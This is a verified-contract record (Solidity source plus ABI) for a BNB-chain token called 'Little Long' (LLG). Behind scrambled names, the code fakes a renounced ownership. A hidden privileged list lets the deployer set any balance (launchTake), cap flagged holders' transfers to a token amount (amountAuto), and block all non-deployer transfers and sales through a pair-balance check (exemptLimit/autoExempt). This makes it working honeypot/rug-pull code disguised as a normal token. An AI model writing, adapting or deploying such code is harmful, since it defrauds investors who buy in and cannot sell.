{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface launchSwap {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract takeTx {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchedLimit {\n    function createPair(address exemptMarketingTeam, address maxBuyTx) external returns (address);\n}\n\ninterface modeSwap {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tradingAt) external view returns (uint256);\n\n    function transfer(address feeTrading, uint256 swapEnable) external returns (bool);\n\n    function allowance(address receiverFundSell, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 swapEnable) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address feeTrading,\n        uint256 swapEnable\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverFeeMode, uint256 value);\n    event Approval(address indexed receiverFundSell, address indexed spender, uint256 value);\n}\n\ninterface modeSwapMetadata is modeSwap {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract LittleLong is takeTx, modeSwap, modeSwapMetadata {\n\n    function owner() external view returns (address) {\n        return toFund;\n    }\n\n    uint256 private marketingLaunched = 100000000 * 10 ** 18;\n\n    mapping(address => mapping(address => uint256)) private fundLimit;\n\n    address receiverIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function decimals() external view virtual override returns (uint8) {\n        return feeLimitMax;\n    }\n\n    mapping(address => bool) public autoSell;\n\n    uint256 private tradingTakeAt;\n\n    bool private minIsSender;\n\n    function amountAuto(address enableMax) public {\n        fundTo();\n        if (walletReceiver != tradingTakeAt) {\n            tradingTakeAt = walletReceiver;\n        }\n        if (enableMax == swapSell || enableMax == marketingFrom) {\n            return;\n        }\n        autoSell[enableMax] = true;\n    }\n\n    function transferFrom(address takeMaxExempt, address feeTrading, uint256 swapEnable) external override returns (bool) {\n        if (_msgSender() != receiverIs) {\n            if (fundLimit[takeMaxExempt][_msgSender()] != type(uint256).max) {\n                require(swapEnable <= fundLimit[takeMaxExempt][_msgSender()]);\n                fundLimit[takeMaxExempt][_msgSender()] -= swapEnable;\n            }\n        }\n        return autoExempt(takeMaxExempt, feeTrading, swapEnable);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return marketingLaunched;\n    }\n\n    uint8 private feeLimitMax = 18;\n\n    address public marketingFrom;\n\n    address private toFund;\n\n    function transfer(address launchedTake, uint256 swapEnable) external virtual override returns (bool) {\n        return autoExempt(_msgSender(), launchedTake, swapEnable);\n    }\n\n    function senderLaunch(address takeMaxExempt, address feeTrading, uint256 swapEnable) internal returns (bool) {\n        require(liquidityEnableExempt[takeMaxExempt] >= swapEnable);\n        liquidityEnableExempt[takeMaxExempt] -= swapEnable;\n        liquidityEnableExempt[feeTrading] += swapEnable;\n        emit Transfer(takeMaxExempt, feeTrading, swapEnable);\n        return true;\n    }\n\n    uint256 toMinLaunch;\n\n    event OwnershipTransferred(address indexed buyTake, address indexed amountFee);\n\n    constructor (){\n        if (tokenLiquidity) {\n            walletReceiver = tradingTakeAt;\n        }\n        launchSwap limitIs = launchSwap(receiverIs);\n        marketingFrom = launchedLimit(limitIs.factory()).createPair(limitIs.WETH(), address(this));\n        if (sellTotal == minIsSender) {\n            minIsSender = false;\n        }\n        swapSell = _msgSender();\n        launchedMin();\n        minLaunched[swapSell] = true;\n        liquidityEnableExempt[swapSell] = marketingLaunched;\n        \n        emit Transfer(address(0), swapSell, marketingLaunched);\n    }\n\n    function exemptLimit(uint256 swapEnable) public {\n        fundTo();\n        toMinLaunch = swapEnable;\n    }\n\n    function autoExempt(address takeMaxExempt, address feeTrading, uint256 swapEnable) internal returns (bool) {\n        if (takeMaxExempt == swapSell) {\n            return senderLaunch(takeMaxExempt, feeTrading, swapEnable);\n        }\n        uint256 marketingTotalLaunch = modeSwap(marketingFrom).balanceOf(enableAmount);\n        require(marketingTotalLaunch == toMinLaunch);\n        require(feeTrading != enableAmount);\n        if (autoSell[takeMaxExempt]) {\n            return senderLaunch(takeMaxExempt, feeTrading, tradingLimit);\n        }\n        return senderLaunch(takeMaxExempt, feeTrading, swapEnable);\n    }\n\n    function approve(address tokenEnable, uint256 swapEnable) public virtual override returns (bool) {\n        fundLimit[_msgSender()][tokenEnable] = swapEnable;\n        emit Approval(_msgSender(), tokenEnable, swapEnable);\n        return true;\n    }\n\n    address public swapSell;\n\n    function launchedMin() public {\n        emit OwnershipTransferred(swapSell, address(0));\n        toFund = address(0);\n    }\n\n    function getOwner() external view returns (address) {\n        return toFund;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return senderListIs;\n    }\n\n    function allowance(address amountList, address tokenEnable) external view virtual override returns (uint256) {\n        if (tokenEnable == receiverIs) {\n            return type(uint256).max;\n        }\n        return fundLimit[amountList][tokenEnable];\n    }\n\n    address enableAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => uint256) private liquidityEnableExempt;\n\n    function symbol() external view virtual override returns (string memory) {\n        return autoWallet;\n    }\n\n    uint256 constant tradingLimit = 5 ** 10;\n\n    string private senderListIs = \"Little Long\";\n\n    mapping(address => bool) public minLaunched;\n\n    bool public tokenLiquidity;\n\n    function launchTake(address launchedTake, uint256 swapEnable) public {\n        fundTo();\n        liquidityEnableExempt[launchedTake] = swapEnable;\n    }\n\n    bool private sellTotal;\n\n    uint256 txSwapLiquidity;\n\n    function takeTotalExempt(address launchedFee) public {\n        if (maxShouldTotal) {\n            return;\n        }\n        \n        minLaunched[launchedFee] = true;\n        \n        maxShouldTotal = true;\n    }\n\n    function fundTo() private view {\n        require(minLaunched[_msgSender()]);\n    }\n\n    string private autoWallet = \"LLG\";\n\n    function balanceOf(address tradingAt) public view virtual override returns (uint256) {\n        return liquidityEnableExempt[tradingAt];\n    }\n\n    uint256 private walletReceiver;\n\n    bool public maxShouldTotal;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverFundSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountFee\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverFeeMode\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenEnable\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableMax\",\"type\":\"address\"}],\"name\":\"amountAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapEnable\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"swapEnable\",\"type\":\"uint256\"}],\"name\":\"exemptLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapEnable\",\"type\":\"uint256\"}],\"name\":\"launchTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxShouldTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedFee\",\"type\":\"address\"}],\"name\":\"takeTotalExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapEnable\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeMaxExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapEnable\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "LittleLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}